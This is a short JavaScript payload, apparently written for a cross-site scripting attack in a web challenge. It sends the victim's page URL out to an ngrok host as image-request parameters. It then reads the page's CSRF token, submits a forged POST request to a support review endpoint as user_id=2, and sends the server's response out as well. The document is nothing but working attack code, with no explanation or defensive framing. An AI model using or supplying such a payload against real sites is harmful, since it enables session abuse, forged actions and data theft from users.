function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://7b1440ce.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
    document.getElementById("chat-div").appendChild(img);
}

send2server("url", window.location.href);

let xhr = new XMLHttpRequest();
xhr.open("POST", "/support/review/4b3891e5a54b5071fe5634d6af4e6407e0377d1635ee7001ae4ad38d3abc9bb6", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
xhr.onload = function() { 
    var resp = "Loaded: "+ xhr.status +"\n\n"+ xhr.response ;
    send2server("PostedResponse", resp);
};
xhr.send("name=Nice&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value);
